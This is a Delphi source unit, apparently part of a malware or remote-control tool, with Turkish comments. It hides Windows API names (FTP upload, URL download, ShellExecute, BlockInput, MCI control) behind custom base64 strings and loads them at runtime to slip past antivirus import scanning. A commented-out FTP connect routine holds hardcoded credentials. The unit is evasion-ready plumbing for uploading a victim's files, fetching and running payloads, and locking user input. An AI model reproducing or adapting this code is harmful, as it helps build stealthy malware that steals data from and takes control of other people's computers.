unit dahilicrypt;

interface
function Decode64(S: string): string;
function InternetOpen(lpszAgent: PChar; dwAccessType: Longword; lpszProxy, lpszProxyBypass: PChar; dwFlags: Longword): Pointer;
function FtpPutFile(hConnect: pointer; lpszLocalFile: PChar; lpszNewRemoteFile: PChar; dwFlags: longword; dwContext: longword): Longbool;
function InternetCloseHandle(hInet: Pointer): LongBool;
//function InternetConnect(hInet: pointer; lpszServerName: PChar; nServerPort: Word; lpszUsername: PChar; lpszPassword: PChar; dwService: LongWord; dwFlags: LongWord; dwContext: Longword): Pointer;
function ShellExecute(hWnd: longword; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HResult;
function mciSendString(lpstrCommand, lpstrReturnString: PChar; uReturnLength: Longword; hWndCallback: Longword): Longword;
function Blockinput(Block: Longbool): Longbool;
function inndir(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: Longword;LPBINDSTATUSCALLBACK: pointer): HResult;

implementation

CONST
Codes64 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';
Kernel = 'Kernel32.dll';

type
LPCSTR = PAnsiChar;
FARPROC = Pointer;
Tcfunc0 = function(lpszAgent: PChar; dwAccessType: Longword; lpszProxy, lpszProxyBypass: PChar; dwFlags: Longword): Pointer; stdcall;
Tcfunc1 = function(hConnect: pointer; lpszLocalFile: PChar; lpszNewRemoteFile: PChar; dwFlags: Longword; dwContext: Longword): Longbool; stdcall;
Tcfunc2 = function(hInet: Pointer): longbool; stdcall;
//Tcfunc3 = function(hInet: Pointer; lpszServerName: PChar; nServerPort: Word; lpszUsername: PChar; lpszPassword: PChar; dwService: Longword; dwFlags: Longword; dwContext: Longword): Pointer; stdcall;
Tcfunc4 = function(hWnd: longword; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HResult; stdcall;
Tcfunc5 = function(lpstrCommand, lpstrReturnString: PChar; uReturnLength: Longword; hWndCallback: Longword): Longword; stdcall;
Tcfunc6 = function(Block: Longbool): Longbool; stdcall;
Tcfunc7 = function(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: Longword;LPBINDSTATUSCALLBACK: pointer): HResult; stdcall;

function LoadLibrary(lpLibFileName: PChar): HMODULE; stdcall; external Kernel name 'LoadLibraryA';
function GetProcAddress(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall; external Kernel name 'GetProcAddress';
function FreeLibrary(hLibModule: HMODULE): Longbool; stdcall; external Kernel name 'FreeLibrary';

var
Handle: array[0..10] of Thandle;
api: array[0..10] of string;
dll: array[0..10] of string;

function Decode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Pos(s[i], codes64) - 1;
    if x >= 0 then
    begin
      b := b * 64 + x;
      a := a + 6;
      if a >= 8 then
      begin
        a := a - 8;
        x := b shr a;
        b := b mod (1 shl a);
        x := x mod 256;
        Result := Result + chr(x);
      end;
    end
    else
      Exit;
  end;
end;

function InternetOpen(lpszAgent: PChar; dwAccessType: Longword; lpszProxy, lpszProxyBypass: PChar; dwFlags: Longword): Pointer;
var
intopen:Tcfunc0;
funcno:integer;
begin
funcno:=0; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
intopen := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @intopen<> nil then begin
result:=intopen(lpszAgent,dwAccessType,lpszProxy, lpszProxyBypass, dwFlags);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

function FtpPutFile(hConnect: pointer; lpszLocalFile: PChar; lpszNewRemoteFile: PChar; dwFlags: Longword; dwContext: Longword) : Longbool;
var
fpf:Tcfunc1;
funcno:integer;
begin
funcno:=1; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
fpf := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @fpf<> nil then begin
result:=fpf(hConnect,lpszLocalFile,lpszNewRemoteFile,dwFlags,dwContext);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

function InternetCloseHandle(hInet: Pointer): LongBool;
var
ICH:Tcfunc2;
funcno:integer;
begin
funcno:=2; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
ICH := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @ICH<> nil then begin
result:=ICH(hInet);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

{
function InternetConnect(hInet: Pointer; lpszServerName: PChar; nServerPort: Word; lpszUsername: PChar; lpszPassword: PChar; dwService: Longword; dwFlags: Longword; dwContext: Longword): pointer;
var
cagir:Tcfunc3;
funcno:integer;
begin
funcno:=3; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
cagir:= GetProcAddress(handle[funcno], pchar(api[funcno]));
if @cagir <> nil then begin
result:=cagir(hInet, 'judith', 21, 'murtaza', 'kerim', dwService, dwFlags, dwContext);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;
}

function ShellExecute(hWnd: longword; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HResult;
var
cagir:Tcfunc4;
funcno:integer;
begin
funcno:=4; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
cagir := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @cagir<> nil then begin
result:=cagir(hWnd, Operation, FileName, Parameters, Directory, ShowCmd);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

function mciSendString(lpstrCommand, lpstrReturnString: PChar; uReturnLength: Longword; hWndCallback: Longword): Longword;
var
cagir:Tcfunc5;
funcno:integer;
begin
funcno:=5; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
cagir := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @cagir<> nil then begin
result:=cagir(lpstrCommand, lpstrReturnString, uReturnLength, hWndCallback);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

function Blockinput(Block: Longbool): Longbool;
var
cagir:Tcfunc6;
funcno:integer;
begin
funcno:=6; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
cagir := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @cagir<> nil then begin
result:=cagir(Block);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

function inndir(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: Longword;LPBINDSTATUSCALLBACK: pointer): HResult;
var
cagir:Tcfunc7;
funcno:integer;
begin
funcno:=7; // civcivli kýsým < =========== <<<<<<<<< !!!!!!!!!!!
handle[funcno]:=loadlibrary(pchar(dll[funcno]));
if handle[funcno] <> 0 then begin
try
cagir := GetProcAddress(handle[funcno], pchar(api[funcno]));
if @cagir<> nil then begin
result:=cagir(Caller, URL, FileName, Reserved,LPBINDSTATUSCALLBACK);
end;
Freelibrary(handle[funcno]);
finally;
end;
end;
end;

begin
api[0]:= 'IMvqPN9kPNHFS6LkGG'; // InternetOpenA
api[1]:= 'HdHmK7LqHcbiPK4'; // FtpPutFileA
api[2]:= 'IMvqPN9kPNH3R6zpPKXXRcHiPG'; // InternetCloseHandle
api[3]:= 'IMvqPN9kPNH3RsvkPMDqGG'; // InternetConnectA
api[4]:= 'KsXbR6n5U6LZTNHbGG'; // ShellExecuteA
api[5]:= 'RMDfKsLkP5DqScbkPq4'; // mciSendStringA
api[6]:= 'GcnlOsj9Rd1rT0'; // BlockInput
api[7]:= 'LL9CH6ztRcnlOMHKRqPfR6L1'; //  URLDownloadToFileA

dll[0]:= 'TsbkQMvbT2vaR6m'; // wininet.dll
dll[4]:= 'SsXbR6mpCYvaR6m'; // shell32.dll
dll[5]:= 'TsbkRMqkP6ni'; // winmm.dll
dll[6]:= 'LLD5KZCoBaHCJ0';   // USER32.DLL
dll[7]:= 'LN9iRMzkBcHiR0';   // Urlmon.dll


//******************************
api[0]:=decode64(api[0]);
api[1]:=decode64(api[1]);
api[2]:=decode64(api[2]);
api[3]:=decode64(api[3]);
api[4]:=decode64(api[4]);
api[5]:=decode64(api[5]);
api[6]:=decode64(api[6]);
api[7]:=decode64(api[7]);

dll[0]:=decode64(dll[0]);
dll[1]:=dll[0];
dll[2]:=dll[0];
dll[3]:=dll[0];
dll[4]:=decode64(dll[4]);
dll[5]:=decode64(dll[5]);
dll[6]:=decode64(dll[6]);
dll[7]:=decode64(dll[7]);

end.
